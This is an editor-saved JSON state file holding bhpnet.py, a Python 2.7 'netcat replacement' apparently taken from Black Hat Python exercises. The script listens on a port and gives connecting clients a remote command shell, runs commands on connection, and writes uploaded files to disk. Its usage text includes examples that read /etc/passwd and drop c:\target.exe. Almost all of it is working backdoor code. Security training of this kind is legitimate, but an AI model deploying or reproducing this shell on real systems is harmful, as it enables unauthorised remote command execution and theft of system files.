{"changed":true,"filter":false,"title":"bhpnet.py","tooltip":"/bhpnet.py","value":"#!/opt/local/bin/python2.7\n\nimport sys\nimport socket\nimport getopt\nimport threading\nimport subprocess\n\n\n# define some global variables\nlisten             = False\ncommand            = False\nupload             = False\nexecute            = \"\"\ntarget             = \"\"\nupload_destination = \"\"\nport               = 0\n\n# this runs a command and returns the output\ndef run_command(command):\n        \n        # trim the newline\n        command = command.rstrip()\n        \n        # run the command and get the output back\n        try:\n                output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)\n        except:\n                output = \"Failed to execute command.\\r\\n\"\n        \n        # send the output back to the client\n        return output\n\n# this handles incoming client connections\ndef client_handler(client_socket):\n        global upload\n        global execute\n        global command\n        \n        # check for upload\n        if len(upload_destination):\n                \n                # read in all of the bytes and write to our destination\n                file_buffer = \"\"\n                \n                # keep reading data until none is available\n                while True:\n                        data = client_socket.recv(1024)\n                        \n                        if not data:\n                                break\n                        else:\n                                file_buffer += data\n                                \n                # now we take these bytes and try to write them out\n                try:\n                        file_descriptor = open(upload_destination,\"wb\")\n                        file_descriptor.write(file_buffer)\n                        file_descriptor.close()\n                        \n                        # acknowledge that we wrote the file out\n                        client_socket.send(\"Successfully saved file to %s\\r\\n\" % upload_destination)\n                except:\n                        client_socket.send(\"Failed to save file to %s\\r\\n\" % upload_destination)\n                        \n                \n        \n        # check for command execution\n        if len(execute):\n                \n                # run the command\n                output = run_command(execute)\n                \n                client_socket.send(output)\n        \n        \n        # now we go into another loop if a command shell was requested\n        if command:\n                \n                while True:\n                        # show a simple prompt\n                        client_socket.send(\"<BHP:#> \")\n                        \n                        # now we receive until we see a linefeed (enter key)\n                        cmd_buffer = \"\"\n                        while \"\\n\" not in cmd_buffer:\n                                cmd_buffer += client_socket.recv(1024)\n                \n                        \n                        # we have a valid command so execute it and send back the results\n                        response = run_command(cmd_buffer)\n                        \n                        # send back the response\n                        client_socket.send(response)\n        \n# this is for incoming connections\ndef server_loop():\n        global target\n        global port\n        \n        # if no target is defined we listen on all interfaces\n        if not len(target):\n                target = \"0.0.0.0\"\n                \n        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server.bind((target,port))\n        \n        server.listen(5)        \n        \n        while True:\n                client_socket, addr = server.accept()\n                \n                # spin off a thread to handle our new client\n                client_thread = threading.Thread(target=client_handler,args=(client_socket,))\n                client_thread.start()\n                \n\n# if we don't listen we are a client....make it so.\ndef client_sender(buffer):\n        \n        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                \n        try:\n                # connect to our target host\n                client.connect((target,port))\n                \n                # if we detect input from stdin send it \n                # if not we are going to wait for the user to punch some in\n                \n                if len(buffer):\n                        \n                        client.send(buffer)\n                \n                while True:\n                        \n                        # now wait for data back\n                        recv_len = 1\n                        response = \"\"\n                        \n                        while recv_len:\n                                data     = client.recv(4096)\n                                recv_len = len(data)\n                                response+= data\n                                \n                                if recv_len < 4096:\n                                        break\n                        \n                        print response, \n                        \n                        # wait for more input\n                        buffer = raw_input(\"\")\n                        buffer += \"\\n\"                        \n                        \n                        # send it off\n                        client.send(buffer)\n                        \n                \n        except:\n                # just catch generic errors - you can do your homework to beef this up\n                print \"[*] Exception! Exiting.\"\n                \n                # teardown the connection                  \n                client.close()  \n                        \n                        \n        \n\ndef usage():\n        print \"Netcat Replacement\"\n        print\n        print \"Usage: bhpnet.py -t target_host -p port\"\n        print \"-l --listen                - listen on [host]:[port] for incoming connections\"\n        print \"-e --execute=file_to_run   - execute the given file upon receiving a connection\"\n        print \"-c --command               - initialize a command shell\"\n        print \"-u --upload=destination    - upon receiving connection upload a file and write to [destination]\"\n        print\n        print\n        print \"Examples: \"\n        print \"bhpnet.py -t 192.168.0.1 -p 5555 -l -c\"\n        print \"bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\\\target.exe\"\n        print \"bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\\\"cat /etc/passwd\\\"\"\n        print \"echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135\"\n        sys.exit(0)\n\n\ndef main():\n        global listen\n        global port\n        global execute\n        global command\n        global upload_destination\n        global target\n        \n        if not len(sys.argv[1:]):\n                usage()\n                \n        # read the commandline options\n        try:\n                opts, args = getopt.getopt(sys.argv[1:],\"hle:t:p:cu:\",[\"help\",\"listen\",\"execute\",\"target\",\"port\",\"command\",\"upload\"])\n        except getopt.GetoptError as err:\n                print str(err)\n                usage()\n                \n                \n        for o,a in opts:\n                if o in (\"-h\",\"--help\"):\n                        usage()\n                elif o in (\"-l\",\"--listen\"):\n                        listen = True\n                elif o in (\"-e\", \"--execute\"):\n                        execute = a\n                elif o in (\"-c\", \"--commandshell\"):\n                        command = True\n                elif o in (\"-u\", \"--upload\"):\n                        upload_destination = a\n                elif o in (\"-t\", \"--target\"):\n                        target = a\n                elif o in (\"-p\", \"--port\"):\n                        port = int(a)\n                else:\n                        assert False,\"Unhandled Option\"\n        \n\n        # are we going to listen or just send data from stdin\n        if not listen and len(target) and port > 0:\n                \n                # read in the buffer from the commandline\n                # this will block, so send CTRL-D if not sending input\n                # to stdin\n                buffer = sys.stdin.read()\n                \n                # send data off\n                client_sender(buffer)   \n        \n        # we are going to listen and potentially \n        # upload things, execute commands and drop a shell back\n        # depending on our command line options above\n        if listen:\n                server_loop()\n\nmain()       ","undoManager":{"mark":-1,"position":5,"stack":[[{"group":"doc","deltas":[{"start":{"row":168,"column":14},"end":{"row":168,"column":15},"action":"insert","lines":["("]}]}],[{"group":"doc","deltas":[{"start":{"row":181,"column":70},"end":{"row":181,"column":71},"action":"insert","lines":[")"]}]}],[{"group":"doc","deltas":[{"start":{"row":168,"column":35},"end":{"row":168,"column":36},"action":"insert","lines":[")"]}]}],[{"group":"doc","deltas":[{"start":{"row":181,"column":70},"end":{"row":181,"column":71},"action":"remove","lines":[")"]}]}],[{"group":"doc","deltas":[{"start":{"row":168,"column":35},"end":{"row":168,"column":36},"action":"remove","lines":[")"]}]}],[{"group":"doc","deltas":[{"start":{"row":168,"column":14},"end":{"row":168,"column":15},"action":"remove","lines":["("]}]}]]},"ace":{"folds":[],"scrolltop":480,"scrollleft":0,"selection":{"start":{"row":74,"column":8},"end":{"row":74,"column":8},"isBackwards":false},"options":{"guessTabSize":true,"useWrapMode":false,"wrapToView":true},"firstLineState":{"row":33,"state":"start","mode":"ace/mode/python"}},"timestamp":1417730295144}